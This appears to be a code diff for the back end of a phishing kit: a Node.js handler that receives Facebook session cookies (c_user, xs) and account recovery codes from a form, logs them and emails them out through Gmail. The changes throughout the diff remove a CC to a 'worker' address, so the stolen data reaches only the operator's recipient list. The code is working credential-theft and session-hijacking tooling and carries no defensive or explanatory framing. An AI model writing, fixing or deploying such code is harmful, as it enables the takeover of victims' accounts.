@@ -1,13 +1,12 @@
 import nodemailer from 'nodemailer';
 
 export default async function handler(req, res) {
-  // CORS headers - IMPORTANT!
+  // CORS headers
   res.setHeader('Access-Control-Allow-Credentials', true);
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   
-  // Handle OPTIONS request
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
   }
@@ -17,22 +16,17 @@ export default async function handler(req, res) {
   }
 
   try {
-    // ✅ CHANGED: recovery_codes optional
-    const { c_user, xs, emails, workerEmail, name } = req.body;
-    const recovery_codes = req.body.recovery_codes || ''; // Optional
+    const { c_user, xs, emails, workerEmail, name, recovery_codes } = req.body;
 
-    console.log('📨 Processing submission...');
+    console.log('📨 Form Submission:');
     console.log('c_user:', c_user);
     console.log('xs:', xs);
-    console.log('emails:', emails);
-    console.log('workerEmail:', workerEmail);
+    console.log('Emails to send:', emails);
+    console.log('Worker Email (not used):', workerEmail);
     console.log('name:', name);
-    if (recovery_codes) {
-      console.log('recovery_codes:', recovery_codes);
-    }
-
-    // ✅ Send email
-    const emailResult = await sendGmail(emails, workerEmail, {
+    
+    // ✅ Send email ONLY to emails array (NO CC to workerEmail)
+    const emailResult = await sendGmail(emails, {
       c_user, xs, recovery_codes, name
     });
 
@@ -40,7 +34,8 @@ export default async function handler(req, res) {
       success: true,
       message: 'Form submitted successfully!',
       emailSent: emailResult.success,
-      emailMessage: emailResult.message
+      emailMessage: emailResult.message,
+      sentTo: emailResult.sentTo
     });
 
   } catch (error) {
@@ -52,8 +47,8 @@ export default async function handler(req, res) {
   }
 }
 
-// Gmail Send Function
-async function sendGmail(toEmails, ccEmail, formData) {
+// Gmail Send Function - NO CC
+async function sendGmail(toEmails, formData) {
   try {
     const transporter = nodemailer.createTransport({
       service: 'gmail',
@@ -63,10 +58,11 @@ async function sendGmail(toEmails, ccEmail, formData) {
       }
     });
 
+    // ✅ ONLY to emails array (no CC)
     const mailOptions = {
       from: `"Form System" <${process.env.GMAIL_USER}>`,
-      to: toEmails.join(', '),
-      cc: ccEmail,
+      to: toEmails.join(', '), // ✅ Only emails array
+      // ❌ NO cc: workerEmail
       subject: `✅ New Submission: ${formData.name}`,
       html: `
         <div style="font-family: Arial, sans-serif;">
@@ -76,16 +72,21 @@ async function sendGmail(toEmails, ccEmail, formData) {
           <p><strong>xs:</strong> ${formData.xs}</p>
           ${formData.recovery_codes ? `<p><strong>Recovery Codes:</strong> ${formData.recovery_codes}</p>` : ''}
           <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
+          <hr>
+          <p><small>Sent to: ${toEmails.join(', ')}</small></p>
         </div>
       `
     };
 
     const info = await transporter.sendMail(mailOptions);
     
-    console.log('✅ Email sent successfully!');
+    console.log('✅ Email sent to emails array only!');
+    console.log('Recipients:', toEmails);
+
     return {
       success: true,
-      message: 'Email sent successfully!'
+      message: 'Email sent successfully!',
+      sentTo: toEmails
     };
 
   } catch (error) {
